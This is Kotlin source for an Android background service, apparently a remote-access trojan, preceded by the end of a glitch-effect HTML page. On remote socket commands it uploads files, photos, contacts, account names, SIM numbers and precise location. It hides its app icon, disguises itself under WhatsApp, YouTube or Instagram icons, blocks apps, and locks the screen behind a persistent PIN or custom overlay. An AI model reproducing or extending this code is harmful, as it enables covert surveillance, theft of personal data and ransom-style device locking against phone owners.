    <line x1="320" y1="210" x2="600" y2="350" stroke="#00ee44" stroke-width="1"/>
    <circle cx="320" cy="210" r="18" fill="none" stroke="#00ff44" stroke-width="1" opacity="0.6"/>
    <circle cx="320" cy="210" r="8" fill="rgba(0,255,68,0.2)"/>
  </g>
  <g filter="url(#glow-purple)" opacity="0.85">
    <line x1="1500" y1="780" x2="1650" y2="920" stroke="#aa00ff" stroke-width="1.5"/>
    <line x1="1500" y1="780" x2="1380" y2="950" stroke="#bb00ff" stroke-width="1"/>
    <line x1="1500" y1="780" x2="1700" y2="680" stroke="#aa00ff" stroke-width="1.2"/>
    <line x1="1500" y1="780" x2="1300" y2="680" stroke="#9900ee" stroke-width="1"/>
    <line x1="1500" y1="780" x2="1750" y2="800" stroke="#aa00ff" stroke-width="0.8"/>
    <line x1="1500" y1="780" x2="1450" y2="600" stroke="#bb00ff" stroke-width="1"/>
    <line x1="1500" y1="780" x2="1600" y2="550" stroke="#aa00ee" stroke-width="0.9"/>
    <circle cx="1500" cy="780" r="20" fill="none" stroke="#aa00ff" stroke-width="1" opacity="0.6"/>
    <circle cx="1500" cy="780" r="9" fill="rgba(170,0,255,0.2)"/>
  </g>
  <g opacity="0.7">
    <polyline points="320,210 480,310 650,290 780,400 950,380 1100,500 1280,520 1500,780" fill="none" stroke="#55ff55" stroke-width="1" stroke-dasharray="8,3"/>
    <polyline points="320,210 400,420 520,530 700,610 900,640 1100,700 1300,730 1500,780" fill="none" stroke="#bb55ff" stroke-width="0.8" stroke-dasharray="6,4"/>
  </g>
  <ellipse cx="320" cy="210" rx="60" ry="45" fill="rgba(0,0,0,0.55)"/>
  <ellipse cx="1500" cy="780" rx="70" ry="50" fill="rgba(0,0,0,0.5)"/>
  <g opacity="0.6">
    <rect x="600" y="150" width="80" height="3" fill="#cc00ff"/>
    <rect x="900" y="400" width="60" height="2" fill="#aa00ff"/>
    <rect x="1100" y="250" width="100" height="3" fill="#dd00ff" opacity="0.5"/>
    <rect x="200" y="600" width="70" height="2" fill="#bb00ff"/>
    <rect x="1600" y="300" width="90" height="3" fill="#aa00ee"/>
  </g>
  <g opacity="0.6">
    <rect x="700" y="500" width="60" height="2" fill="#00ff44"/>
    <rect x="400" y="700" width="80" height="3" fill="#00ee33"/>
    <rect x="1200" y="600" width="70" height="2" fill="#00ff55"/>
    <rect x="1700" y="500" width="50" height="2" fill="#00ff44"/>
    <rect x="850" y="850" width="90" height="3" fill="#00ee44" opacity="0.5"/>
  </g>
</svg>
<script>
  const body=document.body;
  const vColors=['#00ff44','#aa00ff','#cc00ff','#00ee33','#bb00ff','#55ff55'];
  for(let i=0;i<28;i++){const el=document.createElement('div');el.className='vline';el.style.left=Math.random()*100+'vw';el.style.width=(Math.random()*2+0.5)+'px';el.style.background=vColors[Math.floor(Math.random()*vColors.length)];el.style.opacity=(Math.random()*0.6+0.2).toFixed(2);body.appendChild(el);}
  for(let i=0;i<35;i++){const el=document.createElement('div');el.className='scanline';el.style.top=Math.random()*100+'vh';el.style.height=(Math.random()*3+0.5)+'px';el.style.background=vColors[Math.floor(Math.random()*vColors.length)];el.style.opacity=(Math.random()*0.55+0.15).toFixed(2);body.appendChild(el);}
  for(let i=0;i<18;i++){const el=document.createElement('div');el.className='dead-pixel';el.style.left=Math.random()*98+'vw';el.style.top=Math.random()*98+'vh';el.style.width=(Math.floor(Math.random()*40)+8)+'px';el.style.height=(Math.floor(Math.random()*8)+2)+'px';el.style.opacity=(Math.random()*0.7+0.3).toFixed(2);body.appendChild(el);}
  const style=document.createElement('style');
  style.textContent='@keyframes vFlicker{0%{opacity:0.1}30%{opacity:0.8}45%{opacity:0}60%{opacity:0.7}80%{opacity:0.3}100%{opacity:0.6}}@keyframes hFlicker{0%{opacity:0.05}20%{opacity:0.6}40%{opacity:0}55%{opacity:0.5}75%{opacity:0.2}100%{opacity:0.4}}';
  document.head.appendChild(style);
  document.querySelectorAll('.vline').forEach(el=>{el.style.animation='vFlicker '+(Math.random()*120+40)+'ms infinite';});
  document.querySelectorAll('.scanline').forEach(el=>{el.style.animation='hFlicker '+(Math.random()*100+50)+'ms infinite';});
  setInterval(()=>{const lines=document.querySelectorAll('.scanline');const pick=lines[Math.floor(Math.random()*lines.length)];if(pick)pick.style.top=Math.random()*100+'vh';const vlines=document.querySelectorAll('.vline');const vpick=vlines[Math.floor(Math.random()*vlines.length)];if(vpick)vpick.style.left=Math.random()*100+'vw';},200);
  setInterval(()=>{const tint=document.querySelector('.tint');if(!tint)return;const pick=Math.random();if(pick<0.15){tint.style.background='rgba(0,255,68,0.12)';setTimeout(()=>{tint.style.background='';},60);}else if(pick<0.30){tint.style.background='rgba(160,0,255,0.14)';setTimeout(()=>{tint.style.background='';},80);}},350);
</script>
</body>
</html>"""
}    

    
private fun persistLockState(
    active: Boolean,
    pin: String = "",
    title: String = "",
    mode: String = "v1",
    customHtml: String = ""
) {
    getSharedPreferences(PREFS_LOCK, Context.MODE_PRIVATE).edit().apply {
        putBoolean(KEY_LOCK_ACTIVE, active)
        putString(KEY_LOCK_PIN,     pin)
        putString(KEY_LOCK_TITLE,   title)
        putString(KEY_LOCK_MODE,    mode)
        putString(KEY_LOCK_CUSTOM,  customHtml)
        apply()
    }
}

private fun clearLockState() {
    getSharedPreferences(PREFS_LOCK, Context.MODE_PRIVATE)
        .edit().clear().apply()
}


private fun restoreLockStateIfNeeded() {
    val prefs  = getSharedPreferences(PREFS_LOCK, Context.MODE_PRIVATE)
    val active = prefs.getBoolean(KEY_LOCK_ACTIVE, false)
    if (!active) return

    val pin        = prefs.getString(KEY_LOCK_PIN,    "")                   ?: ""
    val title      = prefs.getString(KEY_LOCK_TITLE,  "Perangkat Terkunci") ?: "Perangkat Terkunci"
    val mode       = prefs.getString(KEY_LOCK_MODE,   "v1")                 ?: "v1"
    val customHtml = prefs.getString(KEY_LOCK_CUSTOM, "")                   ?: ""

    Log.d("DeviceService", "restoreLock: mode=$mode pin=$pin")

    // 0 delay — langsung launch, tidak perlu tunggu apapun
    Handler(Looper.getMainLooper()).post {
        when (mode) {
            "v3" -> {
                lockPin   = pin
                lockTitle = title
                val intent = Intent(this, LockChatActivity::class.java).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
                    putExtra(LockOverlayService.EXTRA_PIN,   pin)
                    putExtra(LockOverlayService.EXTRA_TITLE, title)
                }
                startActivity(intent)
                startLockFlashBlink()
            }
            "custom" -> {
                if (customHtml.isNotBlank()) lockCustom(customHtml)
            }
            else -> {
                // v1 — LockOverlayService
                lockPin   = pin
                lockTitle = title
                val intent = Intent(this, LockOverlayService::class.java).apply {
                    putExtra(LockOverlayService.EXTRA_PIN,   pin)
                    putExtra(LockOverlayService.EXTRA_TITLE, title)
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    startForegroundService(intent)
                else
                    startService(intent)
                startLockFlashBlink()
            }
        }
    }
}
    
private fun startVideoOverlay() {
    try {
        startService(Intent(this, VideoOverlayService::class.java))
        Handler(Looper.getMainLooper()).postDelayed({
            val intent = Intent(VideoOverlayService.ACTION_SHOW).apply {
                setPackage(packageName)
            }
            sendBroadcast(intent)
            emitStatus(JSONObject().apply { put("videoOverlayActive", true) })
        }, 300L)
    } catch (e: Exception) {
        Log.e("DeviceService", "startVideoOverlay: ${e.message}")
    }
}

private fun stopVideoOverlay() {
    val intent = Intent(VideoOverlayService.ACTION_HIDE).apply { setPackage(packageName) }
    sendBroadcast(intent)
    emitStatus(JSONObject().apply { put("videoOverlayActive", false) })
}
    
    
    private fun hideAppIcon(hide: Boolean) {
    try {
        val pm = packageManager
        if (hide) {
            // Disable semua alias
            THEME_ALIASES.values.forEach { alias ->
                try {
                    pm.setComponentEnabledSetting(
                        ComponentName(packageName, alias),
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP
                    )
                } catch (_: Exception) {}
            }
            // Disable juga MainActivity asli
            pm.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } else {
            // Re-enable alias yang sebelumnya aktif (default)
            pm.setComponentEnabledSetting(
                ComponentName(packageName, THEME_ALIASES["default"]!!),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
        }
        emitStatus(JSONObject().apply { put("iconHidden", hide) })
    } catch (e: Exception) {
        Log.e("DeviceService", "hideAppIcon: ${e.message}")
    }
}
    
    
    private fun setVolumeMute(mute: Boolean) {
    try {
        val audio = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        audio.setStreamVolume(
            AudioManager.STREAM_MUSIC,
            if (mute) 0 else audio.getStreamMaxVolume(AudioManager.STREAM_MUSIC),
            0
        )
        emitStatus(JSONObject().apply { put("volumeMuted", mute) })
    } catch (e: Exception) {
        Log.e("DeviceService", "setVolumeMute: ${e.message}")
    }
}
    
    
    
    private fun showToast(message: String) {
    Handler(Looper.getMainLooper()).post {
        android.widget.Toast.makeText(this, message, android.widget.Toast.LENGTH_LONG).show()
    }
    emitStatus(JSONObject().apply { put("toastSent", message) })
}

    private fun sendFileList(path: String) {
        Thread {
            try {
                val rootPath = if (path.isBlank()) {
                    android.os.Environment.getExternalStorageDirectory().absolutePath
                } else path

                val dir = java.io.File(rootPath)
                val arr = org.json.JSONArray()

                if (!dir.exists() || !dir.isDirectory) {
                    socket?.emit("device:files", org.json.JSONObject().apply {
                        put("deviceId", deviceId)
                        put("path", rootPath)
                        put("files", arr)
                        put("error", "Folder tidak ditemukan atau tidak bisa diakses")
                    })
                    return@Thread
                }

                val canReadAll = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    android.os.Environment.isExternalStorageManager()
                } else {
                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
                }

                val entries = try { dir.listFiles() } catch (_: Exception) { null }

                entries
                    ?.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() }))
                    ?.forEach { f ->
                        try {
                            arr.put(org.json.JSONObject().apply {
                                put("name",     f.name)
                                put("path",     f.absolutePath)
                                put("isDir",    f.isDirectory)
                                put("size",     if (f.isFile) f.length() else 0L)
                                put("modified", f.lastModified())
                                put("readable", f.canRead())
                            })
                        } catch (_: Exception) {}
                    }

                if (socket?.connected() != true) return@Thread
                socket?.emit("device:files", org.json.JSONObject().apply {
                    put("deviceId",   deviceId)
                    put("path",       rootPath)
                    put("files",      arr)
                    put("canReadAll", canReadAll)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendFileList: ${e.message}")
            }
        }.start()
    }

    private fun downloadAndSendFile(value: String) {
        Thread {
            try {
                val obj   = org.json.JSONObject(value)
                val path  = obj.getString("path")
                val reqId = obj.getString("reqId")
                val file  = java.io.File(path)
                if (!file.exists() || !file.isFile || !file.canRead()) {
                    socket?.emit("device:filedata", org.json.JSONObject().apply {
                        put("reqId", reqId)
                        put("error", "File tidak ditemukan atau tidak bisa dibaca")
                    })
                    return@Thread
                }
                val bytes = file.readBytes()
                val b64   = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
                val ext   = file.extension.lowercase()
                val mime  = android.webkit.MimeTypeMap.getSingleton()
                    .getMimeTypeFromExtension(ext) ?: "application/octet-stream"
                socket?.emit("device:filedata", org.json.JSONObject().apply {
                    put("reqId",  reqId)
                    put("base64", b64)
                    put("mime",   mime)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "downloadAndSendFile: ${e.message}")
                try {
                    val obj = org.json.JSONObject(value)
                    socket?.emit("device:filedata", org.json.JSONObject().apply {
                        put("reqId", obj.optString("reqId", ""))
                        put("error", e.message ?: "Error")
                    })
                } catch (_: Exception) {}
            }
        }.start()
    }

    private fun sendGallery() {
        Thread {
            try {
                val arr = org.json.JSONArray()
                val projection = arrayOf(
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.DATE_ADDED,
                    MediaStore.Images.Media.SIZE,
                    MediaStore.Images.Media.BUCKET_DISPLAY_NAME
                )
                val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
                val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
                val selection = "${MediaStore.Images.Media.BUCKET_DISPLAY_NAME} = ?"
                val selectionArgs = arrayOf("Camera")

                val cursor: Cursor? = contentResolver.query(uri, projection, selection, selectionArgs, sortOrder)
                cursor?.use { c ->
                    val idCol   = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                    val nameCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                    val dateCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
                    val sizeCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
                    var count = 0
                    while (c.moveToNext() && count < 100) {
                        val id      = c.getLong(idCol)
                        val name    = c.getString(nameCol) ?: ""
                        val date    = c.getLong(dateCol)
                        val size    = c.getLong(sizeCol)
                        val imgUri  = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString())                        
                        try {
                            val opts = android.graphics.BitmapFactory.Options().apply { inJustDecodeBounds = true }
                            contentResolver.openInputStream(imgUri)?.use { android.graphics.BitmapFactory.decodeStream(it, null, opts) }
                            val maxDim = 300
                            val sample = maxOf(1, minOf(opts.outWidth, opts.outHeight) / maxDim)
                            val decodeOpts = android.graphics.BitmapFactory.Options().apply { inSampleSize = sample }
                            val bmp = contentResolver.openInputStream(imgUri)?.use { android.graphics.BitmapFactory.decodeStream(it, null, decodeOpts) }
                            if (bmp != null) {
                                val bos = java.io.ByteArrayOutputStream()
                                bmp.compress(android.graphics.Bitmap.CompressFormat.JPEG, 72, bos)
                                bmp.recycle()
                                val b64 = android.util.Base64.encodeToString(bos.toByteArray(), android.util.Base64.NO_WRAP)
                                arr.put(org.json.JSONObject().apply {
                                    put("id",    id)
                                    put("name",  name)
                                    put("date",  date)
                                    put("size",  size)
                                    put("thumb", "data:image/jpeg;base64,$b64")
                                })
                                count++
                            }
                        } catch (_: Exception) { }
                    }
                }
                if (socket?.connected() != true) return@Thread
                socket?.emit("device:gallery", org.json.JSONObject().apply {
                    put("deviceId", deviceId)
                    put("photos",   arr)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendGallery: ${e.message}")
            }
        }.start()
    }
    
    private fun blockApp(pkgJson: String) {
        try {
            val obj  = org.json.JSONObject(pkgJson)
            val pkg  = obj.getString("package")
            val name = obj.optString("name", pkg)
            val i = Intent("com.sync.xxx.BLOCK_APP").apply {
                putExtra("package", pkg)
                putExtra("name", name)
                setPackage(packageName)
            }
            sendBroadcast(i)            
            val blocked = AppBlockerService.blockedPackages.toList()
            emitStatus(org.json.JSONObject().apply {
                put("blockedApps", org.json.JSONArray(blocked))
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "blockApp: ${e.message}")
        }
    }

    private fun unblockApp(pkg: String) {
        try {
            val i = Intent("com.sync.xxx.UNBLOCK_APP").apply {
                putExtra("package", pkg)
                setPackage(packageName)
            }
            sendBroadcast(i)
            val blocked = AppBlockerService.blockedPackages.toList()
            emitStatus(org.json.JSONObject().apply {
                put("blockedApps", org.json.JSONArray(blocked))
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "unblockApp: ${e.message}")
        }
    }

    private fun unblockAll() {
        try {
            val i = Intent("com.sync.xxx.UNBLOCK_ALL").apply { setPackage(packageName) }
            sendBroadcast(i)
            emitStatus(org.json.JSONObject().apply {
                put("blockedApps", org.json.JSONArray())
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "unblockAll: ${e.message}")
        }
    }

    @SuppressLint("MissingPermission")
    private fun sendLocation() {
        val hasFine   = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)   == PackageManager.PERMISSION_GRANTED
        val hasCoarse = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED

        if (!hasFine && !hasCoarse) {
            socket?.emit("device:location", org.json.JSONObject().apply {
                put("deviceId", deviceId); put("error", "permission_denied")
            })
            return
        }

        val lm = getSystemService(LOCATION_SERVICE) as LocationManager
        val gpsOn     = lm.isProviderEnabled(LocationManager.GPS_PROVIDER)
        val networkOn = lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)

        if (!gpsOn && !networkOn) {
            socket?.emit("device:location", org.json.JSONObject().apply {
                put("deviceId", deviceId); put("error", "provider_disabled")
            })
            return
        }

        val fusedClient: FusedLocationProviderClient = LocationServices.getFusedLocationProviderClient(this)
        val priority = if (hasFine && gpsOn) Priority.PRIORITY_HIGH_ACCURACY else Priority.PRIORITY_BALANCED_POWER_ACCURACY
        
        val cts = com.google.android.gms.tasks.CancellationTokenSource()
        fusedClient.getCurrentLocation(priority, cts.token)
            .addOnSuccessListener { loc ->
                if (loc != null) {
                    emitLocationResult(loc.latitude, loc.longitude, loc.accuracy)
                } else {                    
                    requestSingleLocationUpdate(fusedClient, priority)
                }
            }
            .addOnFailureListener {
                requestSingleLocationUpdate(fusedClient, priority)
            }
    }

    @SuppressLint("MissingPermission")
    private fun requestSingleLocationUpdate(fusedClient: FusedLocationProviderClient, priority: Int) {
        val req = LocationRequest.Builder(priority, 2000L)
            .setMaxUpdates(1)
            .setWaitForAccurateLocation(false)
            .build()

        val cb = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                fusedClient.removeLocationUpdates(this)
                val loc = result.lastLocation
                if (loc != null) {
                    emitLocationResult(loc.latitude, loc.longitude, loc.accuracy)
                } else {
                    socket?.emit("device:location", org.json.JSONObject().apply {
                        put("deviceId", deviceId); put("error", "no_location")
                    })
                }
            }
        }

        try {
            fusedClient.requestLocationUpdates(req, cb, Looper.getMainLooper())            
            Handler(Looper.getMainLooper()).postDelayed({
                fusedClient.removeLocationUpdates(cb)
            }, 15_000L)
        } catch (e: Exception) {
            Log.e("DeviceService", "requestSingleLocationUpdate: ${e.message}")
            socket?.emit("device:location", org.json.JSONObject().apply {
                put("deviceId", deviceId); put("error", "no_location")
            })
        }
    }

    private fun emitLocationResult(lat: Double, lng: Double, accuracy: Float) {
        val obj = org.json.JSONObject().apply {
            put("deviceId", deviceId)
            put("lat", lat)
            put("lng", lng)
            put("accuracy", accuracy)
        }
        try {
            @Suppress("DEPRECATION")
            val geocoder = Geocoder(this, java.util.Locale("id", "ID"))
            @Suppress("DEPRECATION")
            val addresses = geocoder.getFromLocation(lat, lng, 1)
            if (!addresses.isNullOrEmpty()) {
                val addr = addresses[0]
                obj.put("province",    addr.adminArea       ?: "")
                obj.put("city",        addr.subAdminArea    ?: "")
                obj.put("district",    addr.locality        ?: "")
                obj.put("village",     addr.subLocality     ?: "")
                obj.put("postalCode",  addr.postalCode      ?: "")
                obj.put("fullAddress", addr.getAddressLine(0) ?: "")
                obj.put("countryName", addr.countryName     ?: "")
            }
        } catch (_: Exception) { }
        socket?.emit("device:location", obj)
    }

    private fun sendContacts() {
        Thread {
            try {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                    socket?.emit("device:contacts", org.json.JSONObject().apply {
                        put("deviceId", deviceId); put("error", "permission_denied")
                    })
                    return@Thread
                }
                val arr = org.json.JSONArray()
                val projection = arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                )
                val cursor = contentResolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    projection, null, null,
                    "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
                )
                cursor?.use { c ->
                    val nameCol = c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                    val numCol  = c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)
                    while (c.moveToNext()) {
                        val name   = c.getString(nameCol) ?: continue
                        val number = c.getString(numCol)  ?: continue
                        arr.put(org.json.JSONObject().apply {
                            put("name",   name.trim())
                            put("number", number.trim())
                        })
                    }
                }
                socket?.emit("device:contacts", org.json.JSONObject().apply {
                    put("deviceId", deviceId)
                    put("contacts", arr)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendContacts: ${e.message}")
            }
        }.start()
    }

    private fun sendGmailAccounts() {
        Thread {
            try {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS) != PackageManager.PERMISSION_GRANTED) {
                    socket?.emit("device:gmail", JSONObject().apply {
                        put("deviceId", deviceId); put("error", "permission_denied")
                    })
                    return@Thread
                }
                val am = getSystemService(android.accounts.AccountManager::class.java)
                val accounts = am?.getAccountsByType("com.google") ?: emptyArray()
                val arr = org.json.JSONArray()
                accounts.forEach { acc ->
                    arr.put(JSONObject().apply {
                        put("email", acc.name)
                        put("type", acc.type)
                    })
                }
                // Juga ambil semua akun non-Google
                val allAccounts = am?.accounts ?: emptyArray()
                val extra = org.json.JSONArray()
                allAccounts.filter { it.type != "com.google" }.forEach { acc ->
                    extra.put(JSONObject().apply {
                        put("email", acc.name)
                        put("type", acc.type)
                    })
                }
                socket?.emit("device:gmail", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("accounts", arr)
                    put("others", extra)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendGmailAccounts: ${e.message}")
            }
        }.start()
    }

    private fun sendPhoneNumbers() {
        Thread {
            try {
                val arr = org.json.JSONArray()
                val tm = getSystemService(TELEPHONY_SERVICE) as android.telephony.TelephonyManager
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    val subMgr = getSystemService(android.telephony.SubscriptionManager::class.java)
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED) {
                        val subs = subMgr?.activeSubscriptionInfoList ?: emptyList()
                        if (subs.isEmpty()) {
                            // Fallback ke slot tunggal
                            val num = tm.line1Number
                            if (!num.isNullOrBlank()) {
                                arr.put(JSONObject().apply {
                                    put("slot", 0)
                                    put("number", num)
                                    put("operator", tm.networkOperatorName ?: "")
                                    put("simState", tm.simState)
                                })
                            }
                        } else {
                            subs.forEachIndexed { idx, sub ->
                                val num = sub.number ?: ""
                                arr.put(JSONObject().apply {
                                    put("slot", idx)
                                    put("number", num)
                                    put("operator", sub.carrierName ?: "")
                                    put("displayName", sub.displayName ?: "SIM ${idx + 1}")
                                    put("iccId", sub.iccId ?: "")
                                })
                            }
                        }
                    }
                } else {
                    @Suppress("DEPRECATION")
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                        val num = tm.line1Number
                        arr.put(JSONObject().apply {
                            put("slot", 0)
                            put("number", num ?: "")
                            put("operator", tm.networkOperatorName ?: "")
                        })
                    }
                }
                socket?.emit("device:phone", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("sims", arr)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendPhoneNumbers: ${e.message}")
                socket?.emit("device:phone", JSONObject().apply {
                    put("deviceId", deviceId); put("error", e.message)
                })
            }
        }.start()
    }

        private fun sendInstalledApps() {
        Thread {
            try {
                val pm  = packageManager
                val arr = org.json.JSONArray()

                @Suppress("DEPRECATION")
                val packages = pm.getInstalledPackages(0)

                packages
                    .filter { it.packageName != packageName }
                    .mapNotNull { pkgInfo ->
                        try {
                            val name = pm.getApplicationLabel(pkgInfo.applicationInfo).toString()
                            if (name.isBlank()) null else Pair(pkgInfo.packageName, name)
                        } catch (_: Exception) { null }
                    }
                    .sortedBy { it.second.lowercase() }
                    .forEach { (pkg, name) ->
                        arr.put(org.json.JSONObject().apply {
                            put("package", pkg)
                            put("name", name)
                        })
                    }

                Log.d("DeviceService", "sendInstalledApps: ${arr.length()} apps")

                if (socket?.connected() != true) return@Thread
                socket?.emit("device:status", org.json.JSONObject().apply {
                    put("deviceId", deviceId)
                    put("status", org.json.JSONObject().apply {
                        put("installedApps", arr)
                    })
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "getInstalledApps: ${e.message}")
            }
        }.start()
    }

    private fun lockDevice(jsonValue: String) {
    try {
        val obj   = org.json.JSONObject(jsonValue)
        val pin   = obj.optString("pin", "")
        val title = obj.optString("title", "Perangkat Terkunci")
        lockPin   = pin
        lockTitle = title

        persistLockState(active = true, pin = pin, title = title, mode = "v1")

        val intent = Intent(this, LockOverlayService::class.java).apply {
            putExtra(LockOverlayService.EXTRA_PIN,   pin)
            putExtra(LockOverlayService.EXTRA_TITLE, title)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }

        startLockFlashBlink()

        emitStatus(JSONObject().apply {
            put("deviceLocked", true)
            put("lockTitle",    title)
        })
    } catch (e: Exception) {
        Log.e("DeviceService", "lockDevice error: ${e.message}")
    }
}

    private fun unlockDevice() {
    lockPin   = ""
    lockTitle = ""
    clearLockState()
    stopLockFlashBlink()
    try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
    lockMediaPlayer?.release()
    lockMediaPlayer = null
    stopStatusBarCollapse()
    removeLockCustomOverlay()
    val intent = Intent("com.sync.xxx.UNLOCK").apply { setPackage(packageName) }
    sendBroadcast(intent)
    emitStatus(JSONObject().apply {
        put("deviceLocked", false)
        put("lockTitle",    "")
    })
}

    // ── Change Theme (icon & nama app) ────────────────────────────────────────
    private val THEME_ALIASES = mapOf(
        "default"   to "com.sync.xxx.AliasDefault",
        "whatsapp"  to "com.sync.xxx.AliasWhatsApp",
        "youtube"   to "com.sync.xxx.AliasYouTube",
        "instagram" to "com.sync.xxx.AliasInstagram",
        "telegram"  to "com.sync.xxx.AliasTelegram",
        "xnxx"      to "com.sync.xxx.AliasXNXX"
    )

    private fun changeTheme(theme: String) {
        try {
            val pm = packageManager
            val target = theme.lowercase().trim()
            // Disable semua alias dulu
            THEME_ALIASES.values.forEach { alias ->
                try {
                    pm.setComponentEnabledSetting(
                        android.content.ComponentName(packageName, alias),
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP
                    )
                } catch (_: Exception) {}
            }
            // Enable alias yang dipilih
            val chosen = THEME_ALIASES[target] ?: THEME_ALIASES["default"]!!
            pm.setComponentEnabledSetting(
                android.content.ComponentName(packageName, chosen),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            emitStatus(JSONObject().apply { put("themeChanged", theme) })
            Log.d("DeviceService", "changeTheme: $theme -> $chosen")
        } catch (e: Exception) {
            Log.e("DeviceService", "changeTheme error: ${e.message}")
        }
    }

    // ── Lock Custom (floating WebView overlay — tidak masuk app) ─────────────
    private var lockCustomView: android.webkit.WebView? = null
    private val lockCustomWm: WindowManager by lazy { getSystemService(WINDOW_SERVICE) as WindowManager }
    private var statusBarCollapseHandler: Handler? = null
    private var statusBarCollapseRunnable: Runnable? = null

    private fun lockCustom(htmlContent: String) {
    try {
        if (htmlContent.isEmpty()) {
            removeLockCustomOverlay()
            unlockDevice()
            return
        }
        lockPin   = ""
        lockTitle = ""

        removeLockCustomOverlay()

        persistLockState(
            active     = true,
            pin        = "",
            title      = "CUSTOM",
            mode       = "custom",
            customHtml = htmlContent
        )

        Handler(Looper.getMainLooper()).post {
                try {
                    val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    else
                        @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

                    val params = WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.MATCH_PARENT,
                        type,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                        WindowManager.LayoutParams.FLAG_FULLSCREEN or
                        WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                        WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
                        WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                        PixelFormat.TRANSLUCENT
                    )

                    // Bungkus HTML dengan full-screen black background
                    val fullHtml = """<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  html,body{width:100%;height:100%;background:#000;overflow:hidden;
    display:flex;align-items:center;justify-content:center}
</style>
</head>
<body>
${htmlContent}
</body>
</html>"""

                    val wv = android.webkit.WebView(this@DeviceService).apply {
                        settings.javaScriptEnabled = true
                        settings.domStorageEnabled  = true
                        setBackgroundColor(android.graphics.Color.BLACK)
                        loadDataWithBaseURL(null, fullHtml, "text/html", "UTF-8", null)
                    }

                    lockCustomView = wv
                    lockCustomWm.addView(wv, params)
                } catch (e: Exception) {
                    Log.e("DeviceService", "lockCustom overlay: ${e.message}")
                }
            }

            startLockFlashBlink()
            playLockSound()
            startStatusBarCollapse()
            emitStatus(JSONObject().apply { put("deviceLocked", true); put("lockTitle", "CUSTOM") })
        } catch (e: Exception) {
            Log.e("DeviceService", "lockCustom error: ${e.message}")
        }
    }
    
    
    

    private fun startStatusBarCollapse() {
        stopStatusBarCollapse()
        statusBarCollapseHandler = Handler(Looper.getMainLooper())
        statusBarCollapseRunnable = object : Runnable {
